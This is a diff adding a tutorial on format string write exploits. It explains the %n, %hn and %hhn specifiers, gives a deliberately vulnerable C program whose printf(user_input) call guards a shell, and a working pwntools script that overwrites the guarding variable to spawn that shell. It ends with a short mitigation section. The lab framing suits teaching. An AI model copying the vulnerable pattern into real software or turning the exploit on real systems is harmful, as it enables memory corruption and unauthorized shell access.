@@ -1,1 +1,114 @@
+A Format String Write vulnerability leverages format specifiers like %n, %hn, or %hhn to write data to arbitrary locations in memory.
+While most format specifiers (%p, %s, %x) read data from the stack, %n does the opposite: it treats the corresponding argument on the stack as a memory address and writes the total number of bytes printed so far into that address.
+By controlling the number of characters printed by printf(), an attacker can write precise values to modify variables, overwrite function pointers, or hijack control flow.
 
+1. The Size Specifiers Explained
+
+Writing large numbers (like a 32-bit memory address) using standard characters would make printf freeze or crash due to outputting gigabytes of text. Instead, we break down the write using smaller size modifiers:
+• %n (4 bytes): Writes a full 32-bit integer (DWORD) to the target address.
+• %hn (2 bytes): Writes a 16-bit short integer (WORD). Useful for writing an address in two separate halves.
+• %hhn (1 byte): Writes a single 8-bit byte (BYTE). This is the safest and most common technique because it allows you to overwrite a 4-byte address one byte at a time, keeping the required character count under 256 bytes per write.
+
+2. The Vulnerable C Program (fs_write.c)
+
+In this scenario, a program controls access via a target variable (authenticated). The goal is to alter the value of authenticated from 0 to a specific value, like 1337 or 0x41 ('A'), without using a buffer overflow.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int authenticated = 0; // Target variable to overwrite
+
+void check_access() {
+    char user_input[128];
+
+    printf("Target Address of 'authenticated': %p\n", (void*)&authenticated);
+    printf("Enter command code: ");
+    
+    int bytes_read = read(0, user_input, 127);
+    user_input[bytes_read - 1] = '\0'; // Strip newline
+
+    // VULNERABILITY: User input evaluated directly by printf
+    printf(user_input);
+    printf("\n");
+
+    if (authenticated == 0x41) { // 0x41 = 65 in decimal ('A')
+        printf("[+] Access Granted! Opening administrative shell...\n");
+        system("/bin/sh");
+    } else {
+        printf("[-] Access Denied. Authenticated value: %d\n", authenticated);
+    }
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    check_access();
+    return 0;
+}
+Use code with caution.
+
+3. Calculating the Write Value
+
+Let's assume our format string offset is 4 (the 4th argument position on the stack maps directly to our input buffer), and the address of authenticated is 0x0804c024.
+To write the value 65 (0x41) into 0x0804c024, our format string must:
+1. Place the target address 0x0804c024 onto the stack (occupies 4 bytes).
+2. Print padding characters until the total character count equals 65.
+3. Call %4$n (or %4$hhn) to write that count into the address at offset 4.
+
+Math Break Down:
+
+• Address placement takes 4 bytes.
+• Target value is 65.
+• Required padding = 65 - 4 = 61 characters.
+• Payload construction: [Address (4 bytes)] + [%61c] + [%4$hhn]
+
+4. The Python Exploit Script (fs_write.py)
+
+Writing payloads manually gets complicated when targeting multi-byte structures. pwntools handles the alignment and padding automatically using the fmtstr_payload module.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Context for 32-bit execution
+context.update(arch='i386', os='linux')
+
+# Start the process
+io = process('./fs_write')
+
+# 1. Grab the target address dynamically if leaked, or use static address
+# For demonstration, we assume it's at a known static location or parse it from output
+io.recvuntil(b"Target Address of 'authenticated': ")
+target_address = int(io.recvline().strip(), 16)
+log.info(f"Target Memory Address: {hex(target_address)}")
+
+# 2. Define the target value we need to write
+target_value = 0x41 # 65 decimal
+
+# 3. Discovered stack offset where our input begins (Assume offset is 4)
+stack_offset = 4
+
+# 4. Generate the format string payload automatically using pwntools
+# This automatically calculates sizes and defaults to %hhn (1-byte writes) for safety
+payload = fmtstr_payload(stack_offset, {target_address: target_value})
+
+log.info(f"Generated Payload: {payload}")
+
+# 5. Send payload to the prompt
+io.recvuntil(b"Enter command code: ")
+io.sendline(payload)
+
+# 6. Interact with the administrative shell
+io.interactive()
+Use code with caution.
+
+5. Defensive Mitigations
+
+To definitively stop format string read and write vulnerabilities, apply these software engineering principles:
+• Enforce Format Literals: Never accept user-supplied arrays directly as the first parameter of format functions. Ensure developers pass variables through explicit type templates:c
+// Vulnerable
+printf(user_input);
+
+// Secure
+printf("%s", user_input);
+Use code with caution.
